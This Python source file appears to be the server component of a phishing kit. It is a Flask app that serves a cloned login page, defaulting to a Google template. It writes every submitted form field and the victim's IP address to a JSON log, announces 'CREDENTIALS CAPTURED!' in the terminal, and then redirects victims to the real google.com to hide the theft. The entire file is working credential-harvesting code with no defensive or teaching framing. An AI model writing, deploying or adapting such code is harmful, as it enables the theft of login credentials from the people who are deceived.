import json
import os
from datetime import datetime
from colorama import Fore, Style
from flask import Flask, render_template, request, redirect

# --- Logger Logic ---
LOG_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'logs', 'captured.json')

def log_credentials(template, data, ip):
    """Logs captured credentials to a JSON file and prints to terminal."""
    log_entry = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'template': template,
        'ip': ip,
        'data': data
    }
    
    os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
    
    logs = []
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, 'r') as f:
                logs = json.load(f)
        except:
            logs = []
            
    logs.append(log_entry)
    
    with open(LOG_FILE, 'w') as f:
        json.dump(logs, f, indent=4)
        
    print(f"\n{Fore.RED}[🔥] CREDENTIALS CAPTURED!{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Template: {template}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}IP:       {ip}{Style.RESET_ALL}")
    for key, value in data.items():
        print(f"{Fore.CYAN}{key}: {value}{Style.RESET_ALL}")
    print(f"{Fore.RED}{'='*30}{Style.RESET_ALL}")

def get_logs():
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, 'r') as f:
                return json.load(f)
        except:
            return []
    return []

# --- Server Logic ---
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TEMPLATE_DIR = os.path.join(BASE_DIR, 'templates')

app = Flask(__name__, template_folder=TEMPLATE_DIR)

# Configuration
CONFIG = {
    'template': 'google',
    'redirect_url': 'https://google.com'
}

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        data = request.form.to_dict()
        ip = request.remote_addr
        log_credentials(CONFIG['template'], data, ip)
        return redirect(CONFIG['redirect_url'])
    
    template_name = CONFIG['template'].replace('"', '').replace("'", "")
    template_path = os.path.join(template_name, 'index.html')
    return render_template(template_path)

def run_server(template='google', redirect_url='https://google.com', port=5000):
    CONFIG['template'] = template
    CONFIG['redirect_url'] = redirect_url
    
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    
    app.run(host='0.0.0.0', port=port, debug=False)
